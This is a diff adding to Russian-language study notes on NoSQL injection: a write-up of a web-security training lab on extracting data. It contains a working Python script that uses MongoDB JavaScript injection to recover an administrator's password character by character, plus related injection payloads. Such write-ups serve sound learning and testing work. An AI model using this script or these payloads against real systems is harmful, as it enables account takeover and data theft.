@@ -267,8 +267,61 @@ admin' && this.password[0] == 'a' || 'a'=='b
 admin' && this.password.match(/\d/) || 'a'=='b
 ```
 # Пример Lab: Exploiting NoSQL injection to extract data
+Для решения лабы необходимо найти точку куда можно подставлять наш payload чтобы возвращало объект из бд, в итоге этой точкой стала `/user/lookup?user=payload` для решения необходимо воспользоваться условием для проверки позиции  на букву, я не захотел 10 раз прогонять интрудер поэтому просто написал скрипт на питоне а потом сделал его более красивым для консоли вот что у меня получилось
 
+```Python
+import string  
+from urllib.parse import quote  
+import requests  
+  
+target = "https://0add003f03072722806962db00f200ed.web-security-academy.net"  
+url = f"{target}/user/lookup?user="  
+cookie = "Nrm7psDbvAYvrSp9TULnPonHFSr6cN42"  
+MAX_LEN = 50  
+ALPHABET = string.ascii_lowercase  
+  
+def bruteForce():  
+  
+    password = ""  
+    print("[*]Запуск брутфорса для Lab: Exploiting NoSQL injection to extract data")  
+    print(f"[*]Цель: {target}")  
+    print(f"[*]Максимальная длина пароля {MAX_LEN}")  
+    print(f"[*]Алфавит: {ALPHABET}")  
+    print("-"*60)  
+  
+    for i in range(MAX_LEN):  
+        found = False  
+        print(f"\n[+]Позиция {i}")  
+        print(f"[+]Текущий пароль: {password if password else '(пусто)'}")  
+  
+        for letter in ALPHABET:  
+            payload = f"administrator' && this.password[{i}] == '{letter}' || 'a'=='b"  
+            encodedPayload = quote(payload)  
+            url1 = url + encodedPayload  
+            try:  
+                response = requests.get(url1, cookies = {"session": cookie}, timeout=5)  
+                if "administrator" in response.text :  
+                    password+=letter  
+                    found = True  
+                    print(f"[+]Символ найден: {letter}")  
+                    print(f"[!]Пароль сейчас: {password}")  
+                    break  
+  
+            except Exception as e:  
+                print(f"[!]Error: {e}")  
+        if not found:  
+            print(f"[!]На {i} позицию символ не найден")  
+            print(f"[*]Пароль на данный момент: {password}")  
+            break  
+    print("="*60)  
+    print(f"[!]Итоговый пароль: {password}")  
+    print("="*60)  
+  
+if __name__ == "__main__":  
+    bruteForce()
+```
 
+В результате получаем наш пароль для админа эксплоит сам выдаст итоговый пароль
 # Идентификация имен полей
 Поскольку MongoDB работает с полуструктурированными данными, не требующими фиксированной схемы, вам может потребоваться определить допустимые поля в коллекции прежде чем вы сможете извлекать данные с помощью инъекции JavaScript
 
